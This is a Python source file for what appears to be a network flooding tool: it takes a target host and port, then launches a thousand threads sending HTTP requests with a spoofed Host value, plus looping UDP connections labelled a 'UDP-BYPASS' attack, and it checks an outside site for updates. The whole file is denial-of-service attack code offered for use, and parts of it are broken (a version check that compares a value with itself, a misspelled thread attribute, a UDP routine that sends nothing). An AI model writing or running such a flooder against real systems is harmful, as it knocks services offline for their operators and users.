import socket
import threading
import argparse
import os
import webbrowser
import requests
import sys
import time
os.system('cls')
# Initialize parser
parser = argparse.ArgumentParser()
 
# Adding optional argument
parser.add_argument("-T", "--Target", help = "Enter target to flood")
parser.add_argument("-p", "--Port", help = "Enter server port")
parser.add_argument("-F", "--Fakeip", help = "Fake but valid ip")
parser.add_argument("-M", "--Method", help = "Changes method")
parser.add_argument("--T", "--Threads", help = "Adds threads")
# Read arguments from command line
args = parser.parse_args()

target = (args.Target)
Port = int(args.Port)
Fakeip = (args.Fakeip)
attack_num = 0
threadcount = 25

def update():
    time.sleep(3)
    webbrowser.open('https://pynxtech.tk/gosniper/')

def checkver():
    content = open("ver.txt", "r") 
    ver = content.read()

def comparever():
    latver = requests.get("https://pynxtech.tk/gosniper/latver.txt")
    latver = latver.text
    if latver != latver:
        print("Updating now. We are sending you the updated url download")
        time.sleep(3)
        update()   

def senditudp():
    sockudp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    sockudp.connect((target, Port))

def lzzz():
    while True:
        senditudp()
        print("Launch UDP-BYPASS Attacker")
        time.sleep(0)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

if args.Method =='udp-bypass':
    lzzz()

def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, Port))
    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, Port))
    s.sendto(("Host: " + Fakeip + "\r\n\r\n").encode('ascii'), (target, Port))
    s.close() 


for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()


threads = []

for i in range(threadcount):
    th = threading.Thread(target=lzzz)
    th.dameon = True
    threads.append(th)

for i in range(threadcount):
    threads[i].start()

for i in range(threadcount):
    threads[i].join()